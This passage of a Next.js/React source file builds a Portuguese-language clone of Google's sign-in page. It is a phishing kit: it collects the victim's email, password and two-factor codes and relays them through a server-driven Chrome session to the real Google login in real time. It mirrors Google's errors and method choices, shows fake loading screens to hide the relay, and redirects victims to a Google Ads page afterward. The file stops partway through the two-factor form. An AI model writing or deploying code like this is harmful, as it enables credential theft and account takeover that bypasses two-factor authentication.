"use client";

import { useEffect, useRef, useState } from "react";
import Link from "next/link";
import { ChevronDown } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import type { DemoSession, DemoStep, SessionEntry } from "@/lib/demo-session";

type LocalStep = DemoStep;

function DeviceAnimation() {
  return (
    <div style={{ width: 220, height: 180, margin: "0 auto 8px", position: "relative", userSelect: "none" }}>
      <video
        src="/20260410-1218-14.3892730.mp4"
        autoPlay
        loop
        muted
        playsInline
        disablePictureInPicture
        controls={false}
        style={{ width: "100%", height: "100%", objectFit: "contain", display: "block", pointerEvents: "none" }}
        onContextMenu={(e) => e.preventDefault()}
      />
      {/* Overlay transparente que intercepta todos os eventos do browser sobre o vídeo */}
      <div
        style={{ position: "absolute", inset: 0, zIndex: 1 }}
        onContextMenu={(e) => e.preventDefault()}
        onClick={(e) => e.preventDefault()}
        onMouseDown={(e) => e.preventDefault()}
        onDoubleClick={(e) => e.preventDefault()}
      />
    </div>
  );
}

function resolveMethodIcon(challengeType: string, label: string): string {
  const l = label.toLowerCase();
  // challengeType "39" é reaproveitado para vários itens — diferenciar pelo label
  if (challengeType === "39") {
    if (l.includes("jeito") || l.includes("another way")) return "/icone8.png";
    if (l.includes("recupera") || l.includes("recovery") || l.includes("dispositivo em")) return "/icone6.png";
    return "/icone1.png"; // "Toque em Sim no seu smartphone"
  }
  const MAP: Record<string, string> = {
    "5":  "/icone2.png", // off-line OTP
    "6":  "/icone3.png", // Authenticator
    "9":  "/icone4.png", // SMS
    "8":  "/icone5.png", // backup codes
    "53": "/icone7.png", // passkey
  };
  return MAP[challengeType] ?? "/icone8.png";
}

function MethodIcon({ challengeType, label, available }: { challengeType: string; label: string; available: boolean }) {
  const src = resolveMethodIcon(challengeType, label);
  return (
    <img
      src={src}
      width={26}
      height={26}
      alt=""
      style={{
        flexShrink: 0,
        marginTop: 1,
        opacity: available ? 1 : 0.4,
        filter: available ? "none" : "grayscale(1)",
      }}
    />
  );
}

async function enterSession(): Promise<SessionEntry> {
  const response = await fetch("/api/v1/auth", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "enter" }),
  });
  return (await response.json()) as SessionEntry;
}

async function postSessionAction(sessionId: string, body: object): Promise<DemoSession> {
  const response = await fetch("/api/v1/auth", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ ...body, sessionId }),
  });
  return (await response.json()) as DemoSession;
}

async function fetchSession(sessionId: string): Promise<DemoSession | null> {
  const response = await fetch(`/api/v1/auth?sessionId=${sessionId}`, { cache: "no-store" });
  if (!response.ok) return null;
  return (await response.json()) as DemoSession;
}

function getTwoFactorText(type: DemoSession["selectedTwoFactorType"]) {
  if (type === "email") {
    return {
      subtitle: "Usar o endereço de e-mail de recuperação",
      subtitleBold: "",
      label: "Inserir código",
    };
  }
  if (type === "authenticator") {
    return {
      subtitle: "Receber um código de verificação do app ",
      subtitleBold: "Google Authenticator",
      label: "Inserir código",
    };
  }
  // sms default
  return {
    subtitle: "Receber um código de verificação no número de telefone",
    subtitleBold: "",
    label: "Inserir código",
  };
}

export default function SignInPage() {
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [step, setStep] = useState<LocalStep>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [captchaChecked, setCaptchaChecked] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passFocused, setPassFocused] = useState(false);
  const [twoFactorFocused, setTwoFactorFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [loadingBar, setLoadingBar] = useState(false);

  const [emailError, setEmailError] = useState("");
  const [passError, setPassError] = useState("");
  const [twoFactorError, setTwoFactorError] = useState("");
  const [releasedTwoFactorType, setReleasedTwoFactorType] = useState<DemoSession["selectedTwoFactorType"]>("sms");
  const [deviceName, setDeviceNameState] = useState<string>("");
  const [availableMethods, setAvailableMethods] = useState<DemoSession["availableMethods"]>([]);
  const [trustedDevice, setTrustedDevice] = useState(true);
  const [chromeReady, setChromeReady] = useState(false);
  const [chromeError, setChromeError] = useState("");

  const sessionCreatedRef = useRef(false);

  useEffect(() => {
    if (sessionCreatedRef.current) return;
    sessionCreatedRef.current = true;
    void enterSession().then((entry) => {
      setSessionId(entry.sessionId);
      if (entry.chromeError) setChromeError(entry.chromeError);
    }).catch(() => {
      setChromeError("Nao foi possivel iniciar a sessao. Tente novamente.");
    });
  }, []);

  useEffect(() => {
    if (!sessionId) return;

    const leave = () => {
      const body = JSON.stringify({ action: "leave", sessionId });
      if (navigator.sendBeacon) {
        navigator.sendBeacon("/api/v1/auth", new Blob([body], { type: "application/json" }));
        return;
      }
      void fetch("/api/v1/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body,
        keepalive: true,
      });
    };

    window.addEventListener("pagehide", leave);
    window.addEventListener("beforeunload", leave);
    return () => {
      window.removeEventListener("pagehide", leave);
      window.removeEventListener("beforeunload", leave);
    };
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId) return;

    let cancelled = false;

    const poll = async () => {
      const session = await fetchSession(sessionId);
      if (cancelled || !session) return;

      // Chrome pronto — libera o formulário
      if (session.chromeReady) {
        setChromeError("");
        setChromeReady(true);
      }

      if (session.chromeError) {
        setChromeError(session.chromeError);
        setLoadingBar(false);
        return;
      }

      // Erro retornado pelo Chrome — volta para o step correto com mensagem
      if (session.inputError) {
        void postSessionAction(sessionId, { action: "clearError" });
        if (session.step === "email") {
          setEmailError(session.inputError);
          setStep("email");
        } else if (session.step === "password") {
          setPassError(session.inputError);
          setStep("password");
        } else if (session.step === "twoFactor") {
          setTwoFactorError(session.inputError);
          setTwoFactorCode("");
          setStep("twoFactor");
        }
        setLoadingBar(false);
        return;
      }

      // Chrome confirmou email → avança para senha
      if (session.step === "password" && step === "email") {
        setLoadingBar(false);
        setStep("password");
        return;
      }

      // Chrome detectou tela de seleção de método
      if (session.step === "chooseMethod" && step !== "chooseMethod") {
        setAvailableMethods(session.availableMethods);
        console.log("[methods]", JSON.stringify(session.availableMethods.map(m => ({ ct: m.challengeType, label: m.label.slice(0, 30) }))));
        setLoadingBar(false);
        setStep("chooseMethod");
        return;
      }

      // Chrome confirmou senha E detectou método → vai direto para twoFactor
      if (session.step === "twoFactor" && session.releasedTwoFactor &&
          (step === "password" || step === "waitingTwoFactor" || step === "chooseMethod")) {
        setReleasedTwoFactorType(session.selectedTwoFactorType);
        if (session.twoFactorDeviceName) setDeviceNameState(session.twoFactorDeviceName);
        setLoadingBar(false);
        setStep("twoFactor");
        return;
      }
      // Atualiza nome do dispositivo em tempo real
      if (step === "twoFactor" && session.twoFactorDeviceName) {
        setDeviceNameState(session.twoFactorDeviceName);
      }

      if (session.forceRedirect) {
        window.location.replace(session.forceRedirect);
      }
    };

    void poll();
    const intervalId = window.setInterval(poll, 500);

    return () => {
      cancelled = true;
      window.clearInterval(intervalId);
    };
  }, [step, sessionId]);

  function handleEmailSubmit() {
    if (!email || loadingBar) return;
    const err = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ? "" : "Insira um endereço de e-mail válido";
    setEmailError(err);
    if (err) return;
    setLoadingBar(true);
    // Dispara o Chrome e aguarda — o polling avança quando session.step === "password"
    void postSessionAction(sessionId!, { action: "submitEmail", email });
  }

  function handlePasswordSubmit() {
    if (!password || loadingBar) return;
    setLoadingBar(true);
    // Dispara o Chrome e aguarda — o polling avança quando session.step === "waitingTwoFactor"
    void postSessionAction(sessionId!, { action: "submitPassword", password });
  }

  async function handleTwoFactorSubmit() {
    if (!twoFactorCode || !sessionId) return;
    setLoadingBar(true);
    await Promise.all([
      postSessionAction(sessionId, { action: "submitTwoFactor", code: twoFactorCode }),
      new Promise((r) => window.setTimeout(r, 5000)),
    ]);
    window.location.replace("https://business.google.com/br/google-ads/");
  }

  function handleTryAnotherWay() {
    if (!sessionId || loadingBar) return;
    setLoadingBar(true);
    void postSessionAction(sessionId, { action: "tryAnotherWay" });
  }

  async function handleCaptchaSubmit() {
    if (!captchaChecked || !sessionId) return;
    setLoadingBar(true);
    await postSessionAction(sessionId, { action: "submitCaptcha" });
    setLoadingBar(false);
    setStep("complete");
  }


  const showIdentityChip = step !== "email" && step !== "complete";
  const isTwoFactorStep = step === "twoFactor" || step === "chooseMethod";
  const twoFactorText = getTwoFactorText(releasedTwoFactorType);

  // Tela de loading enquanto o Chrome não abriu — dá impressão de que a página está carregando
  if (!chromeReady) {
    return (
      <div style={{ minHeight: "100vh", background: "#1E1F20", display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "var(--font-roboto), 'Google Sans', Roboto, Arial, sans-serif" }}>
        <div style={{ width: "100%", maxWidth: 1060, background: "#0E0E0E", borderRadius: 28, overflow: "hidden", minHeight: 402, display: "flex", position: "relative" }}>
          {/* Barra de progresso animada no topo */}
          <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 3, overflow: "hidden", borderRadius: "28px 28px 0 0", background: "rgba(168,199,250,0.10)" }}>
            <div style={{ position: "absolute", top: 0, left: 0, height: "100%", width: "35%", background: "#a8c7fa", borderRadius: 3, animation: "indeterminate 1.4s ease-in-out infinite" }} />
          </div>

          {/* Painel esquerdo — skeleton */}
          <div style={{ width: "100%", maxWidth: 470, padding: "40px", display: "flex", flexDirection: "column", gap: 24 }}>
            {/* Logo skeleton */}
            <div style={{ width: 40, height: 40, borderRadius: 8, background: "#2d2e30" }} />
            {/* Título skeleton */}
            <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
              <div style={{ width: "70%", height: 32, borderRadius: 6, background: "#2d2e30" }} />
              <div style={{ width: "50%", height: 16, borderRadius: 6, background: "#252627" }} />
            </div>
          </div>

          {/* Divisor */}
          <div style={{ width: 1, background: "#3c4043", flexShrink: 0 }} />

          {/* Painel direito — skeleton do formulário */}
          <div style={{ flex: 1, padding: "116px 40px 40px", display: "flex", flexDirection: "column", gap: 20 }}>
            {chromeError ? (
              <>
                <div style={{ color: "#f2b8b5", fontSize: 18, fontWeight: 500 }}>
                  Nao foi possivel preparar o Chrome
                </div>
                <div style={{ color: "#c4c7c5", fontSize: 14, lineHeight: 1.5 }}>
                  {chromeError}
                </div>
                <button
                  type="button"
                  onClick={() => window.location.reload()}
                  style={{ alignSelf: "flex-start", marginTop: 8, border: 0, borderRadius: 20, background: "#a8c7fa", color: "#062e6f", padding: "10px 18px", fontWeight: 600, cursor: "pointer" }}
                >
                  Tentar novamente
                </button>
              </>
            ) : (
              <>
                <div style={{ width: "80%", height: 20, borderRadius: 6, background: "#2d2e30" }} />
                <div style={{ width: "60%", height: 14, borderRadius: 6, background: "#252627" }} />
                <div style={{ width: "100%", height: 56, borderRadius: 4, background: "#252627", marginTop: 8 }} />
                <div style={{ display: "flex", justifyContent: "space-between", marginTop: 16 }}>
                  <div style={{ width: 80, height: 14, borderRadius: 6, background: "#252627" }} />
                  <div style={{ width: 90, height: 40, borderRadius: 20, background: "#2d2e30" }} />
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen flex flex-col justify-between"
      style={{
        background: "#1E1F20",
        fontFamily: "var(--font-roboto), 'Google Sans', Roboto, Arial, sans-serif",
      }}
    >
      <div className="flex-1 flex items-center justify-center px-4 py-8 md:py-10">
        <div
          style={{
            width: "100%",
            maxWidth: 1060,
            background: "#0E0E0E",
            borderRadius: 28,
            overflow: "hidden",
            position: "relative",
          }}
        >
          {/* Barra de progresso no topo */}
          <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 3, overflow: "hidden", borderRadius: "28px 28px 0 0", zIndex: 20, background: "rgba(168,199,250,0.10)", opacity: loadingBar ? 1 : 0, transition: "opacity 0.3s" }}>
            <div style={{ position: "absolute", top: 0, left: 0, height: "100%", width: "35%", background: "#a8c7fa", borderRadius: 3, animation: "indeterminate 1.4s ease-in-out infinite" }} />
          </div>
          {/* Overlay escuro sobre o card inteiro — bloqueia toda interação */}
          {loadingBar && (
            <div style={{ position: "absolute", inset: 0, zIndex: 15, background: "rgba(14,14,14,0.5)", borderRadius: 28, pointerEvents: "all" }} />
          )}

          <div className="flex flex-col md:flex-row" style={{ minHeight: 402 }}>
            <div className="flex flex-col p-8 md:p-10" style={{ width: "100%", maxWidth: 470 }}>
              <div style={{ marginBottom: 40 }}>
                <svg width="40" height="40" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                  <path d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z" fill="#FFC107"/>
                  <path d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z" fill="#FF3D00"/>
                  <path d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z" fill="#4CAF50"/>
                  <path d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z" fill="#1976D2"/>
                </svg>
              </div>

              <AnimatePresence mode="wait">
                {isTwoFactorStep ? (
                  <motion.div
                    key="identity-device"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                  >
                    <h1 style={{ color: "#e8eaed", fontSize: 32, fontWeight: 400, marginBottom: 16, lineHeight: 1.2 }}>
                      Verificação em duas etapas
                    </h1>
                    <p style={{ color: "#bdc1c6", fontSize: 14, lineHeight: 1.6, margin: "0 0 20px 0" }}>
                      Para ajudar a proteger sua conta, o Google quer confirmar se é realmente você que está tentando fazer login.
                    </p>
                    <div
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: 8,
                        border: "1px solid #5f6368",
                        borderRadius: 20,
                        padding: "5px 12px 5px 6px",
                        cursor: "pointer",
                      }}
                    >
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img src="/image.png" alt="" width={24} height={24} style={{ borderRadius: "50%", objectFit: "cover" }} />
                      <span style={{ color: "#e8eaed", fontSize: 14, fontWeight: 400 }}>{email}</span>
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="#9aa0a6">
                        <path d="M7 10l5 5 5-5z"/>
                      </svg>
                    </div>
                  </motion.div>
                ) : !showIdentityChip ? (
                  <motion.div
                    key={`title-${step}`}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.2 }}
                  >
                    <h1 style={{ color: "#e8eaed", fontSize: 56, fontWeight: 400, marginBottom: 10, lineHeight: 1.08, letterSpacing: "-0.02em" }}>
                      {step === "complete" ? "Concluido" : "Faça login"}
                    </h1>
                    <p style={{ color: "#e8eaed", fontSize: 16, fontWeight: 400, margin: 0 }}>
                      {step === "complete"
                        ? "Fluxo finalizado com sucesso."
                        : "Use sua Conta do Google"}
                    </p>
                  </motion.div>
                ) : (
                  <motion.div
                    key="identity-left"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                  >
                    <h1 style={{ color: "#e8eaed", fontSize: 56, fontWeight: 400, marginBottom: 20, lineHeight: 1.08, letterSpacing: "-0.02em" }}>
                      Olá!
                    </h1>
                    <div
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: 8,
                        border: "1px solid #5f6368",
                        borderRadius: 20,
                        padding: "5px 12px 5px 6px",
                        cursor: "pointer",
                      }}
                    >
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img src="/image.png" alt="" width={24} height={24} style={{ borderRadius: "50%", objectFit: "cover" }} />
                      <span style={{ color: "#e8eaed", fontSize: 14, fontWeight: 400 }}>{email}</span>
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="#9aa0a6">
                        <path d="M7 10l5 5 5-5z"/>
                      </svg>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            <div className="p-8 md:p-10" style={{ flex: 1, display: "flex", flexDirection: "column", paddingTop: 116 }}>
              <AnimatePresence mode="wait">
                {step === "email" && (
                  <motion.div
                    key="email-form"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.2 }}
                    style={{ display: "flex", flexDirection: "column", height: "100%" }}
                  >
                    <div style={{ maxWidth: 460, width: "100%", marginLeft: "auto", flex: 1, display: "flex", flexDirection: "column" }}>
                      <div style={{ flex: 1 }}>
                        <div style={{ position: "relative", marginBottom: 8 }}>
                          <input
                            type="email"
                            id="signin-email"
                            value={email}
                            onChange={(e) => { setEmail(e.target.value); setEmailError(""); }}
                            onFocus={() => setEmailFocused(true)}
                            onBlur={() => setEmailFocused(false)}
                            onKeyDown={(e) => e.key === "Enter" && handleEmailSubmit()}
                            autoComplete="email"
                            style={{
                              width: "100%",
                              padding: "20px 16px",
                              background: "transparent",
                              border: `1px solid ${emailError ? "#f28b82" : emailFocused ? "#a8c7fa" : "#5f6368"}`,
                              borderRadius: 4,
                              color: "#e8eaed",
                              fontSize: 16,
                              fontWeight: 400,
                              outline: "none",
                              boxSizing: "border-box",
                              caretColor: "#a8c7fa",
                            }}
                            placeholder=""
                          />
                          <label htmlFor="signin-email" style={{
                            position: "absolute",
                            left: 12,
                            top: emailFocused || email ? -9 : "50%",
                            transform: emailFocused || email ? "translateY(0)" : "translateY(-50%)",
                            transition: "all 0.15s ease",
                            color: emailFocused ? "#a8c7fa" : "#9aa0a6",
                            fontSize: emailFocused || email ? 12 : 14,
                            fontWeight: 400,
                            pointerEvents: "none",
                            background: "#0E0E0E",
                            padding: "0 4px",
                            lineHeight: 1,
                          }}>
                            E-mail ou telefone
                          </label>
                        </div>
                        {emailError && (
                          <p style={{ color: "#f28b82", fontSize: 12, margin: "4px 0 0 4px" }}>
                            {emailError}
                          </p>
                        )}

                        <div style={{ marginTop: 10, marginBottom: 42 }}>
                          <Link href="#" style={{ color: "#a8c7fa", fontSize: 14, fontWeight: 500, textDecoration: "none" }}>
                            Esqueceu o e-mail?
                          </Link>
                        </div>

                        <p style={{ color: "#e8eaed", fontSize: 14, fontWeight: 400, lineHeight: 1.55, margin: 0, maxWidth: 430 }}>
                          Não está no seu computador? Use uma janela de navegação privada para fazer login.{" "}
                          <Link href="#" style={{ color: "#a8c7fa", textDecoration: "none" }}>
                            Saiba como usar o modo visitante.
                          </Link>
                        </p>
                      </div>

                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 24, marginTop: 52, flexWrap: "wrap" }}>
                        <Link href="/admin" style={{ color: "#8ab4f8", fontSize: 13, textDecoration: "none" }}>
                          Abrir painel admin
                        </Link>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "flex-end", gap: 36 }}>
                          <Link href="#" style={{ color: "#a8c7fa", fontSize: 14, fontWeight: 500, textDecoration: "none" }}>
                            Criar conta
                          </Link>
                          <button onClick={handleEmailSubmit} disabled={loadingBar} style={{
                            background: loadingBar ? "#3c4043" : "#a8c7fa", color: loadingBar ? "#9aa0a6" : "#062e6f", borderRadius: 20,
                            fontSize: 14, fontWeight: 500, border: "none", cursor: loadingBar ? "not-allowed" : "pointer",
                            padding: "10px 24px", transition: "box-shadow 0.15s, background 0.15s",
                          }}>
                            Avançar
                          </button>
                        </div>
                      </div>
                    </div>
                  </motion.div>
                )}

                {step === "password" && (
                  <motion.div
                    key="password-form"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    style={{ display: "flex", flexDirection: "column", height: "100%" }}
                  >
                    <div style={{ maxWidth: 460, width: "100%", flex: 1, marginTop: 64 }}>
                      <div style={{ position: "relative", marginBottom: 8 }}>
                        <input
                          type={showPassword ? "text" : "password"}
                          id="signin-password"
                          value={password}
                          onChange={(e) => { setPassword(e.target.value); setPassError(""); }}
                          onFocus={() => setPassFocused(true)}
                          onBlur={() => setPassFocused(false)}
                          onKeyDown={(e) => e.key === "Enter" && handlePasswordSubmit()}
                          autoFocus
                          style={{
                            width: "100%",
                            padding: "20px 16px",
                            background: "transparent",
                            border: `1px solid ${passError ? "#f28b82" : passFocused ? "#a8c7fa" : "#5f6368"}`,
                            borderRadius: 4,
                            color: "#e8eaed",
                            fontSize: 16,
                            fontWeight: 400,
                            outline: "none",
                            boxSizing: "border-box",
                            caretColor: "#a8c7fa",
                          }}
                          placeholder=""
                        />
                        <label htmlFor="signin-password" style={{
                          position: "absolute",
                          left: 12,
                          top: passFocused || password ? -9 : "50%",
                          transform: passFocused || password ? "translateY(0)" : "translateY(-50%)",
                          transition: "all 0.15s ease",
                          color: passFocused ? "#a8c7fa" : "#9aa0a6",
                          fontSize: passFocused || password ? 12 : 14,
                          fontWeight: 400,
                          pointerEvents: "none",
                          background: "#0E0E0E",
                          padding: "0 4px",
                          lineHeight: 1,
                        }}>
                          Digite sua senha
                        </label>
                      </div>

                      <label style={{ display: "flex", alignItems: "center", gap: 12, cursor: "pointer" }}>
                        <input
                          type="checkbox"
                          checked={showPassword}
                          onChange={(e) => setShowPassword(e.target.checked)}
                          style={{ position: "absolute", opacity: 0, width: 1, height: 1, pointerEvents: "none" }}
                        />
                        <span
                          aria-hidden="true"
                          style={{
                            width: 18,
                            height: 18,
                            borderRadius: 5,
                            border: `1px solid ${showPassword ? "#8ab4f8" : "#5f6368"}`,
                            background: showPassword ? "#8ab4f8" : "transparent",
                            display: "inline-flex",
                            alignItems: "center",
                            justifyContent: "center",
                            flexShrink: 0,
                          }}
                        >
                          {showPassword && (
                            <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
                              <path d="M3.2 8.1 6.3 11.2 12.8 4.8" stroke="#0E0E0E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                            </svg>
                          )}
                        </span>
                        <span style={{ color: "#e8eaed", fontSize: 14, fontWeight: 400 }}>Mostrar a senha</span>
                      </label>
                      {passError && (
                        <p style={{ color: "#f28b82", fontSize: 13, margin: "8px 0 0 4px" }}>{passError}</p>
                      )}
                    </div>

                    <div style={{ display: "flex", alignItems: "center", justifyContent: "flex-end", gap: 20, marginTop: 48 }}>
                      <Link href="#" style={{ color: "#a8c7fa", fontSize: 14, fontWeight: 500, textDecoration: "none" }}>
                        Esqueceu a senha?
                      </Link>
                      <button onClick={handlePasswordSubmit} disabled={loadingBar} style={{
                        background: loadingBar ? "#3c4043" : "#a8c7fa", color: loadingBar ? "#9aa0a6" : "#062e6f", borderRadius: 20,
                        fontSize: 14, fontWeight: 500, border: "none", cursor: loadingBar ? "not-allowed" : "pointer",
                        padding: "10px 28px",
                      }}>
                        Avançar
                      </button>
                    </div>
                  </motion.div>
                )}

                {step === "twoFactor" && releasedTwoFactorType === "device" && (
                  <motion.div
                    key="two-factor-device"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    style={{ display: "flex", flexDirection: "column", height: "100%" }}
                  >
                    <div style={{ maxWidth: 460, width: "100%", marginLeft: "auto", flex: 1 }}>
                      <DeviceAnimation />

                      <p style={{ color: "#e8eaed", fontSize: 18, fontWeight: 400, margin: "0 0 12px 0" }}>
                        Verifique seu {deviceName || "dispositivo"}
                      </p>
                      <p style={{ color: "#bdc1c6", fontSize: 14, lineHeight: 1.6, margin: "0 0 8px 0" }}>
                        O Google enviou uma notificação para seu {deviceName || "dispositivo"}. Toque em{" "}
                        <strong style={{ color: "#e8eaed" }}>Sim</strong> na notificação para confirmar sua identidade.
                      </p>
                      <p style={{ color: "#bdc1c6", fontSize: 14, lineHeight: 1.6, margin: "0 0 24px 0" }}>
                        Se você não receber a notificação, tente usar um outro dispositivo.
                      </p>

                      <label style={{ display: "flex", alignItems: "center", gap: 12, cursor: "pointer" }} onClick={() => setTrustedDevice(v => !v)}>
                        <input type="checkbox" checked={trustedDevice} onChange={() => {}} style={{ position: "absolute", opacity: 0, width: 1, height: 1, pointerEvents: "none" }} />
                        <span
                          aria-hidden="true"
                          style={{
                            width: 18, height: 18, borderRadius: 3,
                            border: trustedDevice ? "1px solid #8ab4f8" : "1px solid #5f6368",
                            background: trustedDevice ? "#8ab4f8" : "transparent",
                            display: "inline-flex", alignItems: "center", justifyContent: "center",
                            flexShrink: 0,
                          }}
                        >
                          {trustedDevice && <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M3.2 8.1 6.3 11.2 12.8 4.8" stroke="#0E0E0E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg>}
                        </span>
                        <span style={{ color: "#e8eaed", fontSize: 14, fontWeight: 400 }}>Não perguntar novamente neste dispositivo</span>
                      </label>
                    </div>

                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginTop: 48 }}>
                      <Link href="#" style={{ color: "#a8c7fa", fontSize: 14, fontWeight: 500, textDecoration: "none" }}>
                        Reenviar
                      </Link>
                      <button onClick={handleTryAnotherWay} disabled={loadingBar} style={{ color: "#a8c7fa", fontSize: 14, fontWeight: 500, background: "none", border: "none", cursor: "pointer", padding: 0 }}>
                        Tentar de outro jeito
                      </button>
                    </div>
                  </motion.div>
                )}

                {step === "chooseMethod" && (
                  <motion.div
                    key="choose-method"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    style={{ display: "flex", flexDirection: "column", height: "100%" }}
                  >
                    <div style={{ maxWidth: 460, width: "100%", marginLeft: "auto", flex: 1 }}>
                      <p style={{ color: "#e8eaed", fontSize: 16, fontWeight: 400, margin: "0 0 20px 0" }}>
                        Escolha como fazer login:
                      </p>
                      <div style={{ display: "flex", flexDirection: "column" }}>
                        {availableMethods.map((m, i) => (
                          <button
                            key={i}
                            disabled={!m.available || loadingBar}
                            onClick={() => {
                              if (!m.available || !sessionId) return;
                              setLoadingBar(true);
                              const isTryAnotherWay =
                                m.label.toLowerCase().includes("outro jeito") ||
                                m.label.toLowerCase().includes("another way");
                              if (isTryAnotherWay) {
                                void postSessionAction(sessionId, { action: "tryAnotherWay" });
                              } else {
                                void postSessionAction(sessionId, { action: "selectMethod", challengeType: m.challengeType });
                              }
                            }}
                            style={{
                              display: "flex",
                              alignItems: "flex-start",
                              gap: 16,
                              padding: "14px 0",
                              background: "none",
                              border: "none",
                              borderBottom: "1px solid #3c4043",
                              cursor: m.available && !loadingBar ? "pointer" : "default",
                              textAlign: "left",
                              width: "100%",
                            }}
                          >
                            <MethodIcon challengeType={m.challengeType} label={m.label} available={m.available} />
                            <div>
                              <span style={{ color: m.available ? "#e8eaed" : "#5f6368", fontSize: 14, display: "block", lineHeight: 1.5 }}>
                                {m.label}
                              </span>
                              {m.subtitle && m.subtitle.split("\n").filter(Boolean).map((line, li) => (
                                <em key={li} style={{ color: "#5f6368", fontSize: 12, fontStyle: "normal", display: "block", lineHeight: 1.5 }}>
                                  {line}
                                </em>
                              ))}
                            </div>
                          </button>
                        ))}
                      </div>
                    </div>
                  </motion.div>
                )}

                {step === "twoFactor" && releasedTwoFactorType !== "device" && (
                  <motion.div
                    key="two-factor-form"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    style={{ display: "flex", flexDirection: "column", height: "100%" }}
                  >
                    <div style={{ maxWidth: 460, width: "100%", marginLeft: "auto", flex: 1 }}>
                      <p style={{ color: "#e8eaed", fontSize: 16, fontWeight: 500, margin: "0 0 6px 0" }}>
                        Verificação em duas etapas
                      </p>
                      <p style={{ color: "#bdc1c6", fontSize: 14, lineHeight: 1.5, margin: "0 0 24px 0" }}>
                        {twoFactorText.subtitle}
                        {twoFactorText.subtitleBold && <strong style={{ color: "#e8eaed" }}>{twoFactorText.subtitleBold}</strong>}
                      </p>

                      <div style={{ position: "relative", marginBottom: 16 }}>
                        <input
                          type="text"
                          inputMode="numeric"
                          id="signin-2fa"
                          value={twoFactorCode}
                          onChange={(e) => { setTwoFactorCode(e.target.value); setTwoFactorError(""); }}
                          onFocus={() => setTwoFactorFocused(true)}
                          onBlur={() => setTwoFactorFocused(false)}
                          onKeyDown={(e) => e.key === "Enter" && handleTwoFactorSubmit()}
                          autoFocus
                          style={{
                            width: "100%",
                            padding: "20px 16px",
                            background: "transparent",
                            border: `1px solid ${twoFactorError ? "#f28b82" : twoFactorFocused ? "#a8c7fa" : "#5f6368"}`,
                            borderRadius: 4,
                            color: "#e8eaed",
                            fontSize: 16,
                            fontWeight: 400,
                            outline: "none",
                            boxSizing: "border-box",
                            caretColor: "#a8c7fa",
                          }}
                          placeholder=""
                        />
                        <label htmlFor="signin-2fa" style={{
                          position: "absolute",
                          left: 12,
                          top: twoFactorFocused || twoFactorCode ? -9 : "50%",
                          transform: twoFactorFocused || twoFactorCode ? "translateY(0)" : "translateY(-50%)",
                          transition: "all 0.15s ease",
                          color: twoFactorFocused ? "#a8c7fa" : "#9aa0a6",
